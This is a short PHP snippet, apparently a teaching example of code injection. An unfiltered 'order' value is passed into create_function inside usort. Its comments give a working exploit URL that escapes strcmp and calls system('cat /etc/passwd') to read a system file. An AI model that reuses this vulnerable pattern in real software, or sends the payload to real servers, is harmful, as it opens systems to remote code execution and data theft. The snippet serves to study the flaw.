<?php

//vuln code: no filtering on order, & can therfore inject and execute code in the order variable
// must close the strcmp() function without breaking it.
// exploit: /?order=name,1);}system('cat /etc/passwd');//
if (isset($order)) {
  usort($users, create_function('$a, $b', 'return strcmp($a->'.$order.', $b->'.$order.');'));
}

?>
